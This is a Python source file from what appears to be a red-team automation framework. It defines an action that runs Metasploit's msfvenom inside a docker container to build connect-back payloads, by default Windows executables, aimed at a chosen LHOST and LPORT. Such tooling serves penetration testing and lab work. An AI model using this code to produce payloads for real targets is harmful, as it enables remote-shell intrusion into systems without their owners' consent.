import logging
import os
import subprocess

from diamondback.action import call_before_decorator,Action,CURRENT_DIRECTORY
from diamondback.support import delete_all_files

PATH_TO_MSFVENOM  = "/usr/src/metasploit-framework/msfvenom"
CURRENT_DIRECTORY = os.path.abspath( os.path.dirname(__file__) )
PROJECT_ROOT      = os.path.dirname( os.path.dirname(os.path.dirname(CURRENT_DIRECTORY)) )

class MSFVenom( Action ):
    def __init__(self, *args, **kwargs):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'msfvenom' )

        # Required parameters
        self.container_name = kwargs.get("container", "metasploit")
        self.payload = kwargs.get("payload")
        self.logger.info( f"using payload {self.payload}" )
        self.lhost = kwargs.get("lhost", self.get_local_ip_address())
        self.lport = kwargs.get("lport", 5555)

        self.msfvenom = kwargs.get( 'msfvenom', PATH_TO_MSFVENOM )

        self.logger.info( f"local connection to {self.lhost}:{self.lport}" )

        self.platform = kwargs.get( "platform", "windows" )
        self.format = kwargs.get("format", "exe")
        self.output_filename = kwargs.get("output", f"payload-{self.platform}-{self.format}")

        # use a path that is specific to the running container, not the 
        # host OS. You will get 'Error: No such file or directory' response
        self.path_to_paylods = os.path.join( "/payloads" )

        self.local_path_to_payloads = os.path.join( CURRENT_DIRECTORY, "docker", "payloads" )

        self.output = os.path.join( self.path_to_paylods, self.output_filename )
        self.logger.info( self.output )

        # Validate required args
        if not self.payload or not self.lhost or not self.lport:
            raise ValueError("Missing required arguments: payload, lhost, lport")
        
        path_to_payloads = os.path.join( PROJECT_ROOT, "docker", "payloads" )
        if not os.path.exists( path_to_payloads ):
            self.logger.info( f"create payload output directory--->{path_to_payloads}" )
            os.makedirs( path_to_payloads )
        else:
            self.logger.info( f"paylod directory {path_to_payloads} already exists" )

    def run( self ):
        # Build msfvenom command inside docker exec
        cmd = [
            "docker", "exec", self.container_name,
            f"{self.msfvenom}",
            "-p", self.payload,
            "--platform", self.platform,
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", self.format,
            "-o", self.output
        ]

        try:
            self.logger.info(f"Running: {' '.join(cmd)}")
            subprocess.run(cmd, check=True)
            self.logger.info(f"Payload generated successfully at host-mapped path {self.output}")
        except subprocess.CalledProcessError as e:
            self.logger.info(f"Error generating payload: {e}")
